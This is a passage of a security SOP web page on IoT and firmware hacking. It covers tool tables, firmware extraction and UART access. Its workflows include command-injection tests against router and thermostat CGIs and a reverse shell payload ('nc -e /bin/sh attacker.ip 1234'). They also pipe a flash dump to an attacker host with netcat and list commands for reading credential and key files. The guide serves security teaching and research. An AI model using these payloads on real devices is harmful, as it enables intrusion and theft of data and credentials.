style="color:#d73a49">cat</span><span class="token plain"> /etc/config/vpn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># SNMP community strings:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/config/snmpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Firmware encryption keys:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> / </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*.key&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*.pem&quot;</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="tools-reference">Tools Reference<a href="#tools-reference" class="hash-link" aria-label="Direct link to Tools Reference" title="Direct link to Tools Reference" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="firmware-analysis-tools">Firmware Analysis Tools<a href="#firmware-analysis-tools" class="hash-link" aria-label="Direct link to Firmware Analysis Tools" title="Direct link to Firmware Analysis Tools" translate="no">​</a></h3>
<table><thead><tr><th>Tool</th><th>Purpose</th><th>Platform</th></tr></thead><tbody><tr><td><strong>binwalk</strong></td><td>Firmware extraction, entropy analysis</td><td>Linux, macOS</td></tr><tr><td><strong>firmware-mod-kit</strong></td><td>Firmware unpacking/repacking</td><td>Linux</td></tr><tr><td><strong>jefferson</strong></td><td>JFFS2 filesystem extractor</td><td>Linux</td></tr><tr><td><strong>sasquatch</strong></td><td>SquashFS extractor (supports all versions)</td><td>Linux</td></tr><tr><td><strong>ubi_reader</strong></td><td>UBI/UBIFS filesystem extractor</td><td>Linux</td></tr><tr><td><strong>cramfsck</strong></td><td>CramFS extractor</td><td>Linux</td></tr><tr><td><strong>firmware-analysis-toolkit (FAT)</strong></td><td>Automated firmware analysis</td><td>Linux</td></tr><tr><td><strong>Firmadyne</strong></td><td>Automated firmware emulation</td><td>Linux</td></tr><tr><td><strong>FACT</strong></td><td>Firmware Analysis and Comparison Tool</td><td>Linux (web-based)</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="hardware-tools">Hardware Tools<a href="#hardware-tools" class="hash-link" aria-label="Direct link to Hardware Tools" title="Direct link to Hardware Tools" translate="no">​</a></h3>
<table><thead><tr><th>Tool</th><th>Purpose</th><th>Cost</th></tr></thead><tbody><tr><td><strong>Bus Pirate</strong></td><td>Multi-protocol hardware tool (SPI, I2C, UART, JTAG)</td><td>~$35</td></tr><tr><td><strong>CH341A</strong></td><td>USB SPI flash programmer</td><td>~$5</td></tr><tr><td><strong>FT232</strong></td><td>USB to UART adapter</td><td>~$5</td></tr><tr><td><strong>J-Link</strong></td><td>JTAG debugger (ARM)</td><td>$60-400</td></tr><tr><td><strong>Raspberry Pi</strong></td><td>Multi-purpose (SPI programmer, JTAG, GPIO)</td><td>$35-75</td></tr><tr><td><strong>Logic Analyzer</strong></td><td>Protocol analysis (Saleae Logic, etc.)</td><td>$100-500</td></tr><tr><td><strong>JTAGulator</strong></td><td>JTAG pin identification</td><td>$150</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="emulation--debugging">Emulation &amp; Debugging<a href="#emulation--debugging" class="hash-link" aria-label="Direct link to Emulation &amp; Debugging" title="Direct link to Emulation &amp; Debugging" translate="no">​</a></h3>
<table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><strong>QEMU</strong></td><td>CPU emulation (ARM, MIPS, PowerPC, etc.)</td></tr><tr><td><strong>Firmadyne</strong></td><td>Automated firmware emulation framework</td></tr><tr><td><strong>firmware-analysis-toolkit</strong></td><td>Wrapper for Firmadyne</td></tr><tr><td><strong>ARM-X</strong></td><td>ARM firmware emulation framework</td></tr><tr><td><strong>OpenOCD</strong></td><td>JTAG debugging</td></tr><tr><td><strong>GDB-multiarch</strong></td><td>Multi-architecture debugger</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="binary-analysis-1">Binary Analysis<a href="#binary-analysis-1" class="hash-link" aria-label="Direct link to Binary Analysis" title="Direct link to Binary Analysis" translate="no">​</a></h3>
<table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><strong>Ghidra</strong></td><td>Disassembler/decompiler (ARM, MIPS support)</td></tr><tr><td><strong>IDA Pro</strong></td><td>Commercial disassembler (best ARM/MIPS support)</td></tr><tr><td><strong>Radare2</strong></td><td>Open-source RE framework</td></tr><tr><td><strong>angr</strong></td><td>Binary analysis framework (symbolic execution)</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploitation">Exploitation<a href="#exploitation" class="hash-link" aria-label="Direct link to Exploitation" title="Direct link to Exploitation" translate="no">​</a></h3>
<table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><strong>Metasploit</strong></td><td>Exploitation framework</td></tr><tr><td><strong>pwntools</strong></td><td>Exploit development (Python)</td></tr><tr><td><strong>Burp Suite</strong></td><td>Web application testing</td></tr><tr><td><strong>Nmap</strong></td><td>Network scanning (identify open ports/services)</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="utilities">Utilities<a href="#utilities" class="hash-link" aria-label="Direct link to Utilities" title="Direct link to Utilities" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Essential command-line tools:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    binwalk </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    firmware-mod-kit </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    squashfs-tools </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mtd-utils </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cramfsprogs </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    flashrom </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    openocd </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    qemu-user-static </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    qemu-system-arm </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    qemu-system-mips </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    gdb-multiarch </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    python3-pip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Python tools:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pip3 </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> binwalk python-lzo</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="practical-workflows">Practical Workflows<a href="#practical-workflows" class="hash-link" aria-label="Direct link to Practical Workflows" title="Direct link to Practical Workflows" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="workflow-1-router-firmware-analysis">Workflow 1: Router Firmware Analysis<a href="#workflow-1-router-firmware-analysis" class="hash-link" aria-label="Direct link to Workflow 1: Router Firmware Analysis" title="Direct link to Workflow 1: Router Firmware Analysis" translate="no">​</a></h3>
<p><strong>Scenario:</strong> Analyze TP-Link router firmware for vulnerabilities.</p>
<p><strong>Step 1: Acquire firmware</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> https://static.tp-link.com/</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">./ArcherC7v5_us_firmware.bin</span><br></span></code></pre></div></div>
<p><strong>Step 2: Extract filesystem</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">binwalk </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> ArcherC7v5_us_firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> _ArcherC7v5_us_firmware.bin.extracted/squashfs-root/</span><br></span></code></pre></div></div>
<p><strong>Step 3: Search for vulnerabilities</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Hardcoded credentials:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;password&quot;</span><span class="token plain"> etc/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Web vulnerabilities:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> www/ </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*.cgi&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-exec</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;system(&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example: /www/cgi-bin/admin.cgi calls system() with user input</span><br></span></code></pre></div></div>
<p><strong>Step 4: Test exploit</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Emulate firmware (Firmadyne or QEMU)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Access web interface: http://192.168.0.1/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Test command injection:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://192.168.0.1/cgi-bin/admin.cgi?cmd=;id&quot;</span><br></span></code></pre></div></div>
<p><strong>Step 5: Report vulnerability</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Responsible disclosure to TP-Link</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># CVE request</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="workflow-2-iot-camera-firmware-extraction">Workflow 2: IoT Camera Firmware Extraction<a href="#workflow-2-iot-camera-firmware-extraction" class="hash-link" aria-label="Direct link to Workflow 2: IoT Camera Firmware Extraction" title="Direct link to Workflow 2: IoT Camera Firmware Extraction" translate="no">​</a></h3>
<p><strong>Scenario:</strong> Extract firmware from Wyze camera via UART.</p>
<p><strong>Step 1: Open device, identify UART</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Locate 4-pin header (TX, RX, GND, VCC)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Use multimeter to identify GND (continuity to USB shield)</span><br></span></code></pre></div></div>
<p><strong>Step 2: Connect UART adapter</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Device TX -&gt; Adapter RX</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Device RX -&gt; Adapter TX</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Device GND -&gt; Adapter GND</span><br></span></code></pre></div></div>
<p><strong>Step 3: Determine baud rate</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Try 115200 baud:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">screen</span><span class="token plain"> /dev/ttyUSB0 </span><span class="token number" style="color:#36acaa">115200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Press Enter, look for readable output</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># If garbage, try other baud rates</span><br></span></code></pre></div></div>
<p><strong>Step 4: Access shell</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Power on device, interrupt boot:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Press Ctrl+C during U-Boot countdown</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Modify boot parameters:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setenv bootargs </span><span class="token string" style="color:#e3116c">&quot;init=/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Now have root shell</span><br></span></code></pre></div></div>
<p><strong>Step 5: Dump firmware</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Identify flash partitions:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /proc/mtd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Dump firmware:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">if</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/dev/mtd0 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> attacker.ip </span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># On attacker machine:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> firmware.bin</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="workflow-3-smart-thermostat-privilege-escalation">Workflow 3: Smart Thermostat Privilege Escalation<a href="#workflow-3-smart-thermostat-privilege-escalation" class="hash-link" aria-label="Direct link to Workflow 3: Smart Thermostat Privilege Escalation" title="Direct link to Workflow 3: Smart Thermostat Privilege Escalation" translate="no">​</a></h3>
<p><strong>Scenario:</strong> Escalate from web user to root shell.</p>
<p><strong>Step 1: Analyze web application</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Extract firmware, navigate to web root:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> squashfs-root/www/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Find authentication mechanism:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;login&quot;</span><span class="token plain"> *.php *.cgi</span><br></span></code></pre></div></div>
<p><strong>Step 2: Identify command injection</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Vulnerable CGI: /cgi-bin/settings.cgi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Parameter &quot;temp&quot; is passed to system():</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">system</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;echo </span><span class="token string variable" style="color:#36acaa">$QUERY_STRING</span><span class="token string" style="color:#e3116c"> &gt; /tmp/temp.txt&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Test injection:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://thermostat.ip/cgi-bin/settings.cgi?temp=25;id&quot;</span><br></span></code></pre></div></div>
<p><strong>Step 3: Gain shell</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Reverse shell:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://thermostat.ip/cgi-bin/settings.cgi?temp=25;nc%20-e%20/bin/sh%20attacker.ip%201234&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># On attacker machine:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Got root shell!</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="learning-resources">Learning Resources<a href="#learning-resources" class="hash-link" aria-label="Direct link to Learning Resources" title="Direct link to Learning Resources" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="documentation">Documentation<a href="#documentation" class="hash-link" aria-label="Direct link to Documentation" title="Direct link to Documentation" translate="no">​</a></h3>
<ul>
<li class=""><strong>Binwalk Documentation:</strong> <a href="https://github.com/ReFirmLabs/binwalk/wiki" target="_blank" rel="noopener noreferrer" class="">https://github.com/ReFirmLabs/binwalk/wiki</a></li>
<li class=""><strong>OpenWrt Developer Guide:</strong> <a href="https://openwrt.org/docs/guide-developer/start" target="_blank" rel="noopener noreferrer" class="">https://openwrt.org/docs/guide-developer/start</a></li>
<li class=""><strong>Firmadyne Paper:</strong> <a href="https://firmadyne.com/" target="_blank" rel="noopener noreferrer" class="">https://firmadyne.com/</a></li>
<li class=""><strong>OWASP IoT Security:</strong> <a href="https://owasp.org/www-project-internet-of-things/" target="_blank" rel="noopener noreferrer" class="">https://owasp.org/www-project-internet-of-things/</a></li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="books">Books<a href="#books" class="hash-link" aria-label="Direct link to Books" title="Direct link to Books" translate="no">​</a></h3>
<ul>
<li class=""><strong>The Hardware Hacker</strong> by Andrew &quot;bunnie&quot; Huang</li>
<li class=""><strong>Practical IoT Hacking</strong> by Fotios Chantzis et al.</li>
<li class=""><strong>Hardware Hacking Projects for Geeks</strong> by Scott Fullam</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="online-courses">Online Courses<a href="#online-courses" class="hash-link" aria-label="Direct link to Online Courses" title="Direct link to Online Courses" translate="no">​</a></h3>
<ul>
<li class=""><strong>Hardware Hacking (SANS SEC562)</strong></li>
<li class=""><strong>IoT Penetration Testing (eLearnSecurity)</strong></li>
<li class=""><strong>Offensive IoT Exploitation</strong> by Attify</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="practice-labs">Practice Labs<a href="#practice-labs" class="hash-link" aria-label="Direct link to Practice Labs" title="Direct link to Practice Labs" translate="no">​</a></h3>
<ul>
<li class=""><strong>IoT Goat (OWASP):</strong> Vulnerable IoT firmware</li>
<li class=""><strong>Damn Vulnerable Router Firmware (DVRF):</strong> <a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="noopener noreferrer" class="">https://github.com/praetorian-inc/DVRF</a></li>
<li class=""><strong>Damn Vulnerable ARM Router (DVAR):</strong> Practice firmware exploitation</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="related-sops">Related SOPs<a href="#related-sops" class="hash-link" aria-label="Direct link to Related SOPs" title="Direct link to Related SOPs" translate="no">​</a></h2>
<p><strong>Analysis:</strong></p>
<ul>
<li class=""><a class="" href="/intel-codex/Security/Analysis/sop-reverse-engineering">Reverse Engineering</a> - Binary analysis and disassembly techniques</li>
<li class=""><a class="" href="/intel-codex/Security/Analysis/sop-cryptography-analysis">Cryptography Analysis</a> - Firmware encryption and authentication bypass</li>
<li class=""><a class="" href="/intel-codex/Security/Analysis/sop-malware-analysis">Malware Analysis</a> - Malicious firmware component analysis</li>
</ul>
<p><strong>Pentesting &amp; Security:</strong></p>
<ul>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-linux-pentest">Linux Pentesting</a> - Embedded Linux exploitation</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-mobile-security">Mobile Security</a> - Mobile firmware and bootloader analysis</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-vulnerability-research">Vulnerability Research</a> - Finding embedded device vulnerabilities</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-web-application-security">Web Application Security</a> - Web interfaces on IoT devices</li>
<li class=""><a class="" href="/intel-codex/Security/Pentesting/sop-detection-evasion-testing">Detection Evasion Testing</a> - Bypassing firmware security mechanisms</li>
